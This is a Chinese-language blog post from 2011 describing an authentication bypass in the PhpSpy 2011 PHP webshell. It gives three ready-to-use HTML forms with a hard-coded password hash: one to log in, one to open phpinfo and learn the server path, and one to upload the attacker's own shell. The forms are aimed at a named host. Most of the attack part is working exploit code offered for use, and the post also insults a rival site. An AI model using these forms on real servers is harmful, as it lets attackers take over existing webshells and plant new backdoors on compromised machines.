Phpspy 2011 继续身份验证绕过漏洞
作者：我不知道该唱什么 发布时间：May 1, 2011 14:58:54 分类：tech

官方目前下载已经修补上了 目前官方下载是2011.php， 文件名为2011ok.php的是带洞版本。

鄙视转载不留版权的，特别鄙视下那个什么hack情
http://hi.baidu.com/5427518 / http://www.hackqing.com/
我曾经还以为他是个人物。

今天m0r5和我说phpspy2011 我都不知道2011出来了  - - 就下下来看看

发现2011有不少借鉴WSO Shell的地方，看到$pass还是在那个函数的上面，但是验证成功过后用了一个Location重定向了一下，之后会再次检查一次cookies。

但是想不明白作者为什么这样做，和2010的原理一样，一样绕过：

下面给出一个更为直接的利用方法，上传你自己的新shell：

<form method="POST" action="http://www.hackshell.net/2011ok11.php">
<input name="password" type="text" size="20" value="hackshell_net">
<input type="hidden" name="pass" value="186c5d4c8ea2b5d95585cde854df00f9">
<input type="hidden" name="action" value="login">
<input type="submit" value="Login"></form>

点击Login，这步点登录后 是登录界面  继续操作下一步：
<form method="POST" action="http://www.hackshell.net/2011ok.php">
<input name="password" type="text" size="20" value="hackshell_net">
<input type="hidden" name="pass" value="186c5d4c8ea2b5d95585cde854df00f9">
<input type="hidden" name="action" value="phpinfo"><input type="submit" value="Login"></form>

密码写hackshell_net (默认写好) 点击login之后 查看当前脚本绝对路径，
然后访问：
<form action="http://www.hackshell.net/2011ok.php" method="POST" enctype="multipart/form-data">
<input name="password" type="password" size="20">
<input type="hidden" name="pass" value="186c5d4c8ea2b5d95585cde854df00f9">

<input name="uploadfile" value="" type="file">
<input name="doupfile" value="Upload" type="submit">
<input name="uploaddir" value="D:/workspace/" type="hidden">
<input name="dir" value="D:/workspace/" type="hidden">
</form>


其中把iploaddir的value改为phpinfo中看到的路径，上传shell。